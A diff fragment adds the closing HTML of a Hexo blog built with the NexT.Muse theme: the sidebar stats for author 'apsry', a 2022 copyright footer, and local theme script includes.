+  <p class="site-author-name" itemprop="name">apsry</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">14</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">分类</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">14</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">apsry</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
